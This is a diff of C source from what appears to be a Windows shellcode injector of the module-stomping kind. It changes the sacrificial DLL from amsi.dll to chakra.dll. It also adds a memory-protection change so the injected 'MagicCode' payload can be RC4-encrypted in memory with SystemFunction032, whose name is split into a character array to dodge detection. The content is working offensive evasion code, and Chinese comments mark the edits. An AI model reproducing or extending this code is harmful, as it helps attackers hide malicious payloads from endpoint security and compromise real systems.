@@ -1853,14 +1853,20 @@ int main(int argc, char *argv[])
 
         // Attempt to find a suitable DLL, now passing the calculated requiredSize
         if (!FindSuitableDLL(dllPath, sizeof(dllPath) / sizeof(wchar_t), requiredSize, bTxF, dllOrder, bUseDotnet)) {
-            wprintf(L"[-] No suitable DLL found in the specified order. Falling back to default.\n");
-            wcscpy_s(dllPath, L"C:\\windows\\system32\\amsi.dll"); // Default to amsi.dll
+            // wprintf(L"[-] No suitable DLL found in the specified order. Falling back to default.\n");
+            // wcscpy_s(dllPath, L"C:\\windows\\system32\\amsi.dll"); // Default to amsi.dll
+            wprintf(L"[-] No suitable DLL found... Forcing use of Chakra.dll.\n");
+            // 修改为 chakra.dll (或者 ieframe.dll)
+            wcscpy_s(dllPath, L"C:\\windows\\system32\\chakra.dll");
         } else {
             // wprintf(L"Using DLL: %s\n", dllPath);
         }
     } else {
-        printf("[-] No custom DLL specified. Falling back to amsi.dll.\n");
-        wcscpy_s(dllPath, L"C:\\windows\\system32\\amsi.dll"); // Use the default amsi.dll
+        // printf("[-] No custom DLL specified. Falling back to amsi.dll.\n");
+        // wcscpy_s(dllPath, L"C:\\windows\\system32\\amsi.dll"); // Use the default amsi.dll
+        wprintf(L"[-] No suitable DLL found... Forcing use of Chakra.dll.\n");
+        // 修改为 chakra.dll (或者 ieframe.dll)
+        wcscpy_s(dllPath, L"C:\\windows\\system32\\chakra.dll");
     }
 
     wprintf(L"[+] Using DLL: %ls\n", dllPath);
@@ -2445,6 +2451,25 @@ int main(int argc, char *argv[])
         // Print the calculated entry point and adjusted region size
         printf("[DEBUG] MagicCode Entry Point: %p\n", magiccodeEntrypoint);
         printf("[DEBUG] Adjusted Region Size: %llu bytes\n", (unsigned long long)adjustedRegionSize);
+
+        // ================== 新增代码开始 ==================
+        // 1. 在加密前，必须先将内存改为可读写 (PAGE_READWRITE)
+        ULONG oldProtectEncryption = 0;
+        status = NtProtectVirtualMemory(
+            hProcess, 
+            &magiccodeEntrypoint, 
+            &adjustedRegionSize, 
+            PAGE_READWRITE, 
+            &oldProtectEncryption
+        );
+
+        if(!NT_SUCCESS(status)) {
+             printf("[-] Failed to change memory to RW for encryption. Status: %x\n", status);
+             return 1;
+        } else {
+             printf("[+] Memory changed to RW for RC4 encryption.\n");
+        }
+        // ================== 新增代码结束 ==================
 
         // Hide it with sys func 32: 
         const char sysfunc32Char[] = { 'S', 'y', 's', 't', 'e', 'm', 'F', 'u', 'n', 'c', 't', 'i', 'o', 'n', '0', '3', '2', 0 };
